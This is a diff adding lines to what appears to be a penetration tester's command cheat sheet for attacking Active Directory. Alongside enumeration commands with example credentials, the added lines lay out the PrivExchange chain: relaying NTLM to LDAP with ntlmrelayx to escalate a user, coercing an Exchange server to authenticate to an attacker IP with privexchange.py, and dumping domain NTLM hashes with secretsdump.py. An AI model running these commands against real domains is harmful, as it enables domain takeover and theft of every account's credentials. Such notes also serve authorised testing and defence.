@@ -10,7 +10,10 @@ Invoke-Bloodhound -v -Domain seemant.bisht.local
 
 goddi-windows-amd64.exe -username=juser -password="Fall2017!" -domain="demo.local" -dc="10.2.9.220" -unsafe
 
-
+python ntlmrelayx.py -t ldap://<DC FQDN> --escalate-user <Domain Username who has Mailbox access>
+privexchange.py -ah <Attacker IP> <Exchange Server FQDN> -u <Domain Username who has Mailbox access> -d <Domain Name>
+iptables -A INPUT -p TCP --destination-port 80 -j DROP
+python secretsdump.py -just-dc-ntlm -just-dc-user <Domain Name>/<Domain username for whom to grab NTLM hash> <Domain Name>/<Domain Username who has Mailbox access>@<DC FQDN>
 
 
 Get-SQLInstanceDomain -Verbose -Username 'Domain_name\User_Name' -Password 'Password@123' -DomainController 10.100.100.3 | Get-SQLConnectionTestThreaded -Verbose -Threads 15
